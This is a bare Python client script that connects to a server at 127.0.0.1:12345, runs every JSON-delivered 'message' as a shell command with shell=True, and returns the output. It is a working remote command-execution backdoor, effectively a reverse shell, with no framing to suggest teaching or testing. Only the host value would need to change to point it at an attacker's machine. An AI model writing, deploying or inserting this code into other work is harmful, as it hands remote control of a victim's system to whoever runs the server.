import socket
import json
import os
import subprocess

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '127.0.0.1'
    port = 12345

    client_socket.connect((host, port))
    print("Connected to the server.")

    while True:
        response = client_socket.recv(1024).decode()
        if not response:
            break
        response = json.loads(response)
        print("Server's response:", response)
        output = ""
        try:
            output = subprocess.check_output(response["message"], shell=True)
            output = str(output, encoding="437")
        except subprocess.CalledProcessError as e:
            output = "Error: " + str(e)
            print("Error:", e)
        except Exception as e:
            output = "Error: " + str(e)
            print("Error:", e)
        print("Output:", output)
        client_socket.sendall(json.dumps({"message": output}).encode())

    client_socket.close()

if __name__ == "__main__":
    main()
